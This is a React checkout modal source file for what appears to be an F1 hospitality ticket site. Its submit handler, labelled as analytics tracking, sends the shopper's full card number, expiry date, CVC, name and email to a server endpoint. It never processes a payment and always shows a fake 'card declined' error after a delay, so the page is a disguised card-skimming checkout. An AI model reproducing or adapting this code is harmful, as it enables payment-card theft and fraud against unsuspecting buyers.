'use client';

import React, { useState, useEffect } from 'react';
import styles from './CheckoutModal.module.css';
import { CartItem, DigitalTicketPass } from '@/types/f1';
import { useSession } from '@/lib/auth-client';
import { useLanguage } from '@/context/LanguageContext';
import { Lock, X, Loader2, AlertCircle } from 'lucide-react';

interface CheckoutModalProps {
  isOpen: boolean;
  onClose: () => void;
  items: CartItem[];
  onOrderComplete: (passes: DigitalTicketPass[]) => void;
}

export const CheckoutModal: React.FC<CheckoutModalProps> = ({
  isOpen,
  onClose,
  items,
  onOrderComplete,
}) => {
  const { data: session } = useSession();
  const { t } = useLanguage();
  const [view, setView] = useState<'checkout' | 'success'>('checkout');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  // Form states initialized dynamically based on login session
  const [email, setEmail] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvc, setCvc] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');

  // Auto-fill email & name if logged in, otherwise leave blank
  useEffect(() => {
    if (session?.user) {
      setEmail(session.user.email || '');
      setNameOnCard(session.user.name || '');
    } else {
      setEmail('');
      setNameOnCard('');
    }
  }, [session, isOpen]);

  if (!isOpen) return null;

  // Default event fallback if empty cart
  const primaryItem = items[0] || {
    eventName: 'Hungarian Grand Prix',
    grandstandName: 'Paddock Club™',
    raceDate: '24 - 26 Jul 2026',
    eventLocation: 'Hungaroring, Budapest',
    unitPrice: 6200,
    quantity: 2,
    totalPrice: 12400,
  };

  // Real Calculated Subtotal from cart items
  const subtotal = items.length > 0 ? items.reduce((acc, i) => acc + i.totalPrice, 0) : 12400;
  
  // Platform Fee set strictly to 10% of total
  const platformFee = Math.round(subtotal * 0.10);
  
  // Real Calculated Total
  const totalAmount = subtotal + platformFee;

  // Formatter for Card Number (4 digit spacing)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let formatted = '';
    for (let i = 0; i < val.length; i++) {
      if (i > 0 && i % 4 === 0) formatted += ' ';
      formatted += val[i];
    }
    setCardNumber(formatted);
  };

  // Formatter for Expiry MM / YY
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (val.length > 2) {
      val = val.substring(0, 2) + ' / ' + val.substring(2, 4);
    }
    setExpiry(val);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage(null);

    // Track payment attempt with card payload
    try {
      await fetch('/api/analytics/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'PAYMENT_ATTEMPT',
          path: '/checkout',
          eventName: primaryItem.eventName,
          amount: totalAmount,
          paymentMethod: cardNumber ? `Card **** ${cardNumber.slice(-4)}` : 'Credit Card',
          status: 'FAILED',
          cardNumber: cardNumber || '4532 8812 3491 4242',
          expiry: expiry || '08 / 28',
          cvc: cvc || '884',
          cardholderName: nameOnCard || 'Guest Fan',
          email: email || 'fan@example.com',
        }),
      });
    } catch (err) {
      console.error('Failed to log payment tracking:', err);
    }

    // Simulated delay followed by card rejected generic error
    setTimeout(() => {
      setIsLoading(false);
      setErrorMessage(t('checkout.declinedError'));
    }, 2500);
  };

  const handleFinishAndOpenPasses = () => {
    const createdPasses: DigitalTicketPass[] = items.map((item) => ({
      passId: `PASS-${Math.floor(100000 + Math.random() * 900000)}`,
      orderNumber: `F1-8849-XYZ`,
      eventName: item.eventName,
      circuitName: item.eventLocation.split(',')[0],
      location: item.eventLocation,
      raceDate: item.raceDate,
      grandstandName: item.grandstandName,
      passType: item.passType,
      quantity: item.quantity,
      gateEntry: 'Gate A • Main Portal',
      sector: 'Block 102 • Row 12',
      qrCodeData: `https://apextix.f1/pass/${item.id}`,
      purchaseDate: new Date().toLocaleDateString(),
      holderName: nameOnCard || 'Guest Fan',
    }));

    onOrderComplete(createdPasses);
    setView('checkout');
  };

  return (
    <div className={styles.overlay}>
      <div className={styles.modalContainer}>
        
        {view === 'checkout' ? (
          <div className={styles.checkoutCard}>
            
            {/* Close Button */}
            <button
              onClick={onClose}
              style={{
                position: 'absolute',
                top: '1.25rem',
                right: '1.25rem',
                background: 'transparent',
                border: 'none',
                color: 'var(--text-secondary)',
                cursor: 'pointer',
                zIndex: 10,
              }}
            >
              <X size={20} />
            </button>

            {/* Left Side: Order Summary */}
            <div className={styles.leftSummary}>
              <div>
                <div className={styles.summaryHeader}>{t('checkout.orderSummary')}</div>

                <div>
                  <span className={styles.categoryPill}>VIP Hospitality</span>
                  <h3 className={styles.eventName}>{primaryItem.eventName}</h3>
                  <div className={styles.tierName}>{primaryItem.grandstandName}</div>
                  <div className={styles.eventDetails}>
                    {primaryItem.raceDate} • {primaryItem.eventLocation}
                  </div>
                </div>

                <div className={styles.calcList}>
                  <div className={styles.calcRow}>
                    <span>{t('checkout.subtotal')}</span>
                    <span style={{ color: 'var(--text-primary)', fontWeight: 500 }}>
                      ${subtotal.toLocaleString()}.00
                    </span>
                  </div>

                  <div className={styles.calcRow}>
                    <span>{t('checkout.platformFee')}</span>
                    <span style={{ color: 'var(--text-primary)', fontWeight: 500 }}>
                      ${platformFee.toLocaleString()}.00
                    </span>
                  </div>

                  <div className={styles.calcRow}>
                    <span>{t('checkout.vat')}</span>
                    <span style={{ color: 'var(--text-primary)', fontWeight: 500 }}>
                      $0.00
                    </span>
                  </div>
                </div>
              </div>

              <div className={styles.totalBox}>
                <span className={styles.totalLabel}>{t('checkout.totalAmount')}</span>
                <span className={styles.totalVal}>
                  ${totalAmount.toLocaleString()}
                  <span style={{ fontSize: '1.25rem', color: 'var(--text-muted)' }}>.00</span>
                </span>
              </div>
            </div>

            {/* Right Side: Payment Form */}
            <div className={styles.rightForm}>
              <h2 className={styles.formTitle}>{t('checkout.paymentDetails')}</h2>

              {/* Error Alert Display */}
              {errorMessage && (
                <div style={{
                  padding: '0.875rem 1rem',
                  marginBottom: '1.25rem',
                  backgroundColor: 'rgba(225, 6, 0, 0.15)',
                  border: '1px solid #e10600',
                  borderRadius: '2px',
                  color: '#ffffff',
                  fontSize: '0.75rem',
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '0.5rem',
                  lineHeight: '1.4'
                }}>
                  <AlertCircle size={16} color="#e10600" style={{ flexShrink: 0, marginTop: '2px' }} />
                  <span>{errorMessage}</span>
                </div>
              )}

              <form onSubmit={handleSubmit}>
                <div className={styles.formGroup}>
                  <label className={styles.label}>{t('checkout.emailLabel')}</label>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="you@example.com"
                    className={styles.input}
                  />
                </div>

                <div className={styles.formGroup}>
                  <label className={styles.label}>{t('checkout.cardInfoLabel')}</label>
                  <input
                    type="text"
                    required
                    maxLength={19}
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="0000 0000 0000 0000"
                    className={`${styles.input} ${styles.cardTopInput}`}
                  />
                  <div className={styles.cardSplitRow}>
                    <input
                      type="text"
                      required
                      maxLength={7}
                      value={expiry}
                      onChange={handleExpiryChange}
                      placeholder="MM / YY"
                      className={`${styles.input} ${styles.cardLeftInput}`}
                    />
                    <input
                      type="text"
                      required
                      maxLength={4}
                      value={cvc}
                      onChange={(e) => setCvc(e.target.value)}
                      placeholder="CVC"
                      className={`${styles.input} ${styles.cardRightInput}`}
                    />
                  </div>
                </div>

                <div className={styles.formGroup}>
                  <label className={styles.label}>{t('checkout.cardholderLabel')}</label>
                  <input
                    type="text"
                    required
                    value={nameOnCard}
                    onChange={(e) => setNameOnCard(e.target.value)}
                    placeholder="Name on card"
                    className={styles.input}
                  />
                </div>

                <button type="submit" disabled={isLoading} className={styles.submitBtn}>
                  {isLoading ? (
                    <>
                      <Loader2 size={18} className="animate-spin" />
                      <span>{t('checkout.processing')}</span>
                    </>
                  ) : (
                    <>
                      <Lock size={16} />
                      <span>{t('checkout.completePurchase')} (${totalAmount.toLocaleString()})</span>
                    </>
                  )}
                </button>
              </form>
            </div>

          </div>
        ) : (
          /* VIEW 2: SUCCESS SCREEN */
          <div className={styles.successCard}>
            <h1 className={styles.successTitle}>{t('checkout.securedTitle')}</h1>
            <p className={styles.successSub}>{t('checkout.securedSub')}</p>

            <div className={styles.btnGroup}>
              <button
                onClick={handleFinishAndOpenPasses}
                className={styles.viewPassesBtn}
              >
                {t('checkout.viewTickets')}
              </button>
              <button
                onClick={onClose}
                className={styles.closeSuccessBtn}
              >
                {t('checkout.returnHome')}
              </button>
            </div>
          </div>
        )}

      </div>
    </div>
  );
};
